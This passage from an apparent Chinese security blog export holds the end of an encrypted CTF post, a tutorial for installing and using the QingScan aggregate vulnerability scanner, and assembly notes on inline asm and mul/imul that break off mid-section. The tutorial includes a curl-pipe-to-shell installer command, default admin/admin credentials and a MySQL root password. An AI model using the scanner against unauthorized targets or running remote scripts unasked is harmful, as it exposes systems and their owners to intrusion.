8d5047aad60c0f0714ed9d26e21f399e220613398439e7cd08ceeb53490421abcc694592d72b56490891da43dcd4c005abb7b9681c5d64e1ca428855ec707933bb2d875e6cc4745256e4749c022d47dac0a0e20958ae13b8eedb7bbbafad21d3121f099bff7da2a3a66eee552cabbadfd99fc0b53c31905bfea97c56c64243050d175630351632a65c09189853d8ad6008a72edff9b9a55e9d0f9fd54b7281ddd4400bc7aa98af92bd1689d5b4b30</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>批量漏洞挖掘工具QS的安装与使用教程</title>
    <url>/article/159145e.html</url>
    <content><![CDATA[<h2 id="介绍"><a class="anchor" href="#介绍">#</a> <strong>介绍</strong></h2>
<p>QingScan 是一款聚合扫描器，本身不生产安全扫描功能，但会作为一个安全扫描工具的搬运工；当添加一个目标后，QingScan 会自动调用各种扫描器对目标进行扫描，并将扫描结果录入到 QingScan 平台中进行聚合展示</p>
<p>· GitHub：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL1FpbmdTY2Fu">https://github.com/78778443/QingScan</span></p>
<p>・码云地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vc29uZ2JveS9RaW5nU2Nhbg==">https://gitee.com/songboy/QingScan</span></p>
<p>・详细文档：<span class="exturl" data-url="aHR0cDovL3dpa2kucWluZ3NjYW4uc29uZ2JveS5zaXRl">http://wiki.qingscan.songboy.site</span></p>
<p>・哔哩哔哩：<span class="exturl" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vNDM3MjczMDY1">https://space.bilibili.com/437273065</span></p>
<p>・官网地址：<span class="exturl" data-url="aHR0cDovL3FpbmdzY2FuLnNvbmdib3kuc2l0ZS8=">http://qingscan.songboy.site/</span></p>
<p>关于 QingScan 功能大体分为四个方向，信息收集，黑盒扫描，白盒审计，POC 利用，共计集成了 28 款插件，除了下图的内容，还有 nmap、fofa 等等未展示在思维导图内。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109182358718.png" alt="image-20220109182358718" /></p>
<h2 id="在线演示"><a class="anchor" href="#在线演示">#</a> <strong>在线演示</strong></h2>
<p><span class="exturl" data-url="aHR0cDovL3R4eThnLnNvbmdib3kuc2l0ZTo4MTEyLw==">在线体验直达</span></p>
<p>用户名：admin</p>
<p>密码：admin</p>
<p>注：在线体验地址为功能演示，不会对目标实际扫描～</p>
<h2 id="安装教程"><a class="anchor" href="#安装教程">#</a> <strong>安装教程</strong></h2>
<h4 id="1-dockers官方下载地址"><a class="anchor" href="#1-dockers官方下载地址">#</a> 1、 dockers 官方下载地址：</h4>
<p><span class="exturl" data-url="aHR0cDovL2dldC5kYW9jbG91ZC5pby8=">官网教程</span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>curl <span class="token operator">-</span>sSL https<span class="token punctuation">:</span><span class="token operator">//</span>get<span class="token punctuation">.</span>daocloud<span class="token punctuation">.</span>io<span class="token operator">/</span>docker <span class="token operator">|</span> sh</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109182818670.png" alt="image-20220109182818670" /></p>
<h4 id="2-安装composer管理工具"><a class="anchor" href="#2-安装composer管理工具">#</a> 2、 安装 composer 管理工具</h4>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>curl <span class="token operator">-</span>L https<span class="token punctuation">:</span><span class="token operator">//</span>get<span class="token punctuation">.</span>daocloud<span class="token punctuation">.</span>io<span class="token operator">/</span>docker<span class="token operator">/</span>compose<span class="token operator">/</span>releases<span class="token operator">/</span>download<span class="token operator">/</span><span class="token number">1.25</span><span class="token number">.1</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose<span class="token operator">-</span>`uname <span class="token operator">-</span>s`<span class="token operator">-</span>`uname <span class="token operator">-</span>m` <span class="token operator">-</span>o <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109183207237.png" alt="image-20220109183207237" /></p>
<p>添加可执行权限：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>chmod <span class="token operator">+</span>x <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>docker<span class="token operator">-</span>compose</pre></td></tr></table></figure><p>3、下载 QingScani 源码：<br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL1FpbmdTY2Fu">https://github.com/78778443/QingScan</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109183636741.png" alt="image-20220109183636741" /></p>
<p>4、拉取镜像并自动启动项目：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>cd QingScan<span class="token operator">/</span>docker<span class="token operator">/</span>latest <span class="token operator">&amp;</span><span class="token operator">&amp;</span> docker<span class="token operator">-</span>compose up <span class="token operator">-</span>d</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109183751740.png" alt="image-20220109183751740" /></p>
<p>首次启动需要更新容器内代码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>docker <span class="token keyword">exec</span> qingscan sh <span class="token operator">-</span>c <span class="token string">'cd /root/qingscan &amp;&amp; git fetch &amp;&amp; git reset --hard origin/main &amp;&amp; rm code/public/install/install.lock'</span></pre></td></tr></table></figure><p>依次执行命令创建 MySQL 数据库</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>docker <span class="token keyword">exec</span> <span class="token operator">-</span>it mysqlser bash</pre></td></tr></table></figure><p>进入数据库交互</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>p123</pre></td></tr></table></figure><p>执行创建数据库</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>CREATE DATABASE IF NOT EXISTS QingScan<span class="token punctuation">;</span></pre></td></tr></table></figure><p>5. 浏览器访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLw==">http://127.0.0.1:8000/</span> 自动进入安装界面</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184201778.png" alt="image-20220109184201778" /></p>
<h2 id="使用教程"><a class="anchor" href="#使用教程">#</a> 使用教程</h2>
<p>默认账号：admin</p>
<p>密码：admin</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184607569.png" alt="image-20220109184607569" /></p>
<p>填写配置信息，一般为默认。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184626507.png" alt="image-20220109184626507" /></p>
<p>点击下一步，配置信息即可导入成功</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184724126.png" alt="image-20220109184724126" /></p>
<p>返回主页登录即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184815756.png" alt="image-20220109184815756" /></p>
<h4 id="1-控制单个插件开关"><a class="anchor" href="#1-控制单个插件开关">#</a> 1、控制单个插件开关</h4>
<p>在系统设置→守护进程列表，这里可以控制单个插件是否启动。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184902525.png" alt="image-20220109184902525" /></p>
<h4 id="2-添加扫描任务"><a class="anchor" href="#2-添加扫描任务">#</a> 2、添加扫描任务</h4>
<p>在黑盒，添加目标信息即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109184931803.png" alt="image-20220109184931803" /></p>
<h4 id="3-查看扫描结果"><a class="anchor" href="#3-查看扫描结果">#</a> 3、查看扫描结果</h4>
<p>点击 “查看详情” 去查看漏洞详细信息，可以看到 app 信息、指纹识别、子域名等等…，</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220109185159490.png" alt="image-20220109185159490" /></p>
<p>1.fortify 涉及许可证问题，镜像内不包含，需要自己将 Linux 版本的 fortify 放到 /data/tools 文件夹中。</p>
<p>2.AWVS 调用主要通过 API，需要自己将 API 配置系统，配置管理中去。</p>
<p><strong>注：在安装之后请不要对未获得足够授权的目标进行扫描。</strong></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之内联汇编</title>
    <url>/article/f2951c20.html</url>
    <content><![CDATA[<p>这么可爱的冰墩墩谁能不爱呢？</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210201545182.png" alt="image-20220210201545182" /></p>
<p>-&gt; 新建项目</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210193415741.png" alt="image-20220210193415741" /></p>
<p>-&gt; 新建项</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210193623789.png" alt="image-20220210193623789" /></p>
<p>-&gt; 文件命名</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210193734093.png" alt="image-20220210193734093" /></p>
<p>在 <code>main</code>  函数中使用内联汇编，通过 <code>_asm</code>  调用汇编</p>
<p><strong>单条指令</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210194134521.png" alt="image-20220210194134521" /></p>
<p><strong>多条指令</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210194448777.png" alt="image-20220210194448777" /></p>
<p>同时，内联汇编支持在 <code>_asm</code>  外定义变量</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210194654674.png" alt="image-20220210194654674" /></p>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">// 立即数</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	_asm <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>			<span class="token comment">// 通过 mov 传送立即数</span></pre></td></tr><tr><td data-num="7"></td><td><pre>			mov ebx<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="8"></td><td><pre>			mov ecx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 还可通过 lea 传送字符串 lea esi,string</span></pre></td></tr></table></figure><p><strong>关于报错</strong></p>
<p>若运行失败，请检查运行库是否为 &quot;多线程调试&quot; 模式</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210201317556.png" alt="image-20220210201317556" /></p>
<p>如此这期摸鱼就到此结束啦！</p>
<p>期待下次不可以这么摸鱼了 QAQ！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220210201835162.png" alt="image-20220210201835162" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之乘法与除法指令and扩展加减法学习</title>
    <url>/article/c66b0376.html</url>
    <content><![CDATA[<p>2022 年，祝大家虎虎生威，在新的一年里如虎添 &quot;亿&quot;！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/6552ACE61B22AF9BF38AF19117707646.gif" alt="image-6552ACE61B22AF9BF38AF19117707646" /></p>
<h1 id="乘法与除法指令"><a class="anchor" href="#乘法与除法指令">#</a> 乘法与除法指令</h1>
<h2 id="乘法mulimul"><a class="anchor" href="#乘法mulimul">#</a> 乘法 mul/imul</h2>
<p><strong>符号</strong></p>
<ul>
<li>
<p>无符号：mul div</p>
</li>
<li>
<p>有符号：imul idiv</p>
</li>
</ul>
<p><strong>元素</strong></p>
<ul>
<li>
<p>乘数：bl bx ebx</p>
</li>
<li>
<p>被乘数：al ax eax</p>
</li>
</ul>
<h3 id="无符号测试"><a class="anchor" href="#无符号测试">#</a> 无符号测试</h3>
<h4 id="八位乘法"><a class="anchor" href="#八位乘法">#</a> 八位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">5</span>h</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov bl<span class="token punctuation">,</span><span class="token number">10</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mul bl</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 5</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204162659125.png" alt="image-20220204162659125" /></p>
<p>ebx = 10</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204162716471.png" alt="image-20220204162716471" /></p>
<p>eax = 50</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204162730441.png" alt="image-20220204162730441" /></p>
<h4 id="十六位乘法"><a class="anchor" href="#十六位乘法">#</a> 十六位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ax<span class="token punctuation">,</span><span class="token number">2000</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov bx<span class="token punctuation">,</span><span class="token number">100</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul bx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 2000</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204163308096.png" alt="image-20220204163308096" /></p>
<p>ebx = 100</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204163322166.png" alt="image-20220204163322166" /></p>
<p>edx = 20，也即 00200000</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204163338775.png" alt="image-20220204163338775" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204163444599.png" alt="image-20220204163444599" /></p>
<h4 id="32位乘法"><a class="anchor" href="#32位乘法">#</a> 32 位乘法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	mul ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204164654094.png" alt="image-20220204164654094" /></p>
<p>ebx = 1000</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204164804220.png" alt="image-20220204164804220" /></p>
<p>eax = 12345000</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204164820611.png" alt="image-20220204164820611" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204165002073.png" alt="image-20220204165002073" /></p>
<p>以上就是无符号运算的测试结果，接下来进行有符号的乘法运算测试。</p>
<h3 id="有符号测试"><a class="anchor" href="#有符号测试">#</a> 有符号测试</h3>
<p>首先我们要知道的是 imul 执行有符号的乘法不同于 mul 执行无符号的乘法的地方是：imul 会保持乘积的符号。</p>
<p>它实现的方法就是把这个乘积的低半部分的一个最高位的符号扩展到高半部分上去。</p>
<p>另外 imul 的三种模式分为</p>
<ul>
<li>一个操作数：乘积放在 ax，bx 中，类似于 mul</li>
<li>两个操作数：乘积放在第一个操作数中，此时这个操作数必须是一个寄存器</li>
<li>三个操作数：后两个操作数的运算结果存放到操作数一当中，且第三个操作数为立即数</li>
</ul>
<h4 id="双操作数测试"><a class="anchor" href="#双操作数测试">#</a> 双操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">1000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul eax<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204182830693.png" alt="image-20220204182830693" /></p>
<p>更改 ebx = 100000h 时，可以看到 eax 已经溢出，但是并没有存放到 edx 中</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204182917791.png" alt="image-20220204182917791" /></p>
<p>也即运行结果存放在第一个操作数当中，此时其相当于一个寄存器。</p>
<h4 id="三操作数测试"><a class="anchor" href="#三操作数测试">#</a> 三操作数测试</h4>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清零</pre></td></tr><tr><td data-num="20"></td><td><pre>	xor edx<span class="token punctuation">,</span>edx</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">12345</span>h</pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span>mov ebx<span class="token punctuation">,</span><span class="token number">100000</span>h</pre></td></tr><tr><td data-num="23"></td><td><pre>	imul edx<span class="token punctuation">,</span>eax<span class="token punctuation">,</span><span class="token number">12</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p>eax = 12345h</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204183625596.png" alt="image-20220204183625596" /></p>
<p>可以看到计算存放在 edx 中，也即第一个操作数当中</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220204183703000.png" alt="image-20220204183703000" /></p>
<h2 id="除法dividiv"><a class="anchor" href="#除法dividiv">#</a> 除法 div/idiv</h2>
<p><strong>元素</strong></p>
<ul>
<li>除数</li>
<li>被除数</li>
<li>商</li>
